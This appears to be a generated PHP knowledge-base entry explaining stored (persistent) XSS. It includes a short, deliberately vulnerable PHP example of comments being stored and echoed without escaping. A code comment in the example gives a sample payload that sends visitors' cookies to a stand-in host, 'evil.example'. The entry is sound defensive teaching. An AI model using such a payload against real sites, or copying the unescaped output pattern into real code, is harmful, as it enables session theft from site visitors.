---
type: "PHP Feature"
title: "Stored XSS"
description: "Stored XSS, also called persistent XSS, is a variant of ``XSS`` where the malicious payload is saved on the server, in a database, a comment field, a log, or any other storage the application later reads back, instead of being reflected immediately from the current request."
resource: "https://owasp.org/www-community/Types_of_Cross-Site_Scripting"
tags: ["security", "vulnerability"]
generated:
  by: "analyzeG3/scripts/makeKnowledgeGraph"
  at: "2026-08-30T10:00:00+00:00"
---

# Stored XSS

Stored XSS, also called persistent XSS, is a variant of ``XSS`` where the malicious payload is saved on the server, in a database, a comment field, a log, or any other storage the application later reads back, instead of being reflected immediately from the current request.

Because the payload is persisted, every user who later views the page containing it executes the attacker's script, with no need to click a crafted link or visit a special URL, unlike reflected XSS. This also makes stored XSS more dangerous: a single injection can affect every visitor, including administrators.

Stored XSS commonly slips through when a team treats the database as an implicitly trusted source, sanitizing or validating data only on the way in, and then trusting it enough to skip output encoding on the way out. The database itself provides no protection: encoding must still be applied at the point where the stored value is written into HTML, JavaScript, or another output context.

```php
<?php

    // Write path: attacker submits a malicious comment.
    $body = $_POST['comment']; // e.g. '<script>document.location="//evil.example/?c="+document.cookie</script>'
    $pdo->prepare('INSERT INTO comments (body) VALUES (?)')->execute([$body]);

    // Read path, later, for every visitor: raw output re-executes the payload.
    foreach ($pdo->query('SELECT body FROM comments') as $comment) {
        echo $comment['body']; // vulnerable: should be htmlspecialchars($comment['body'])
    }

?>
```

## Documentation
- [https://owasp.org/www-community/Types_of_Cross-Site_Scripting](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)

## See Also
- [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)

## Related
- [Cross Site Scripting (XSS)](/features/xss.md)
- [HTML Escaping](/features/escape-html.md)
- [Sanitation](/features/sanitation.md)
- [HTMLPurifier](/features/htmlpurifier.md)
- [Taint Analysis](/features/taint.md)
- [Database](/features/database.md)
- [Write Context](/features/write-context.md)

